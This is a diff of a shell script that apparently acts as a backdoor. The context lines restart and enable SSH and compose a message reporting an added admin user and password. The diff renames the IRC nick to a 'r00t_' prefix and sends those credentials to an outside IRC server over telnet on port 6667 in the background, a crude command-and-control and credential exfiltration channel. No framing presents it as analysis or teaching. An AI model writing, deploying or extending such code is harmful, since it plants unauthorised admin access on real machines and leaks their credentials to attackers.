@@ -23,20 +23,8 @@ if [ -f /usr/bin/yum ]; then service sshd restart && systemctl enable sshd; fi;
 if [ -f /usr/bin/apt ]; then service ssh restart && systemctl enable ssh; fi;
 arr4y="Added admin:, $random_user, password:, $random_number";
 echo $arr4y;
-echo "NICK $random_user" > input 
+echo "NICK r00t_$random_user" > input 
 echo "USER $user" >> input
 echo "JOIN #$channel" >> input
-echo "PRIVMSG #$channel :$arr4y" >> input
-tail -f input | telnet $server 6667 | while read res
-do
-  case "$res" in
-    # respond to ping requests from the server
-    PING*)
-      echo "$res" | sed "s/I/O/" >> input
-    ;;
-    # for pings on nick/user
-    *"You have not"*)
-      echo "JOIN #$channel" >> input
-    ;;
-  esac
-done
+tail -f input | telnet $server 6667 &
+sleep 5 && echo "PRIVMSG #$channel :$arr4y" >> input
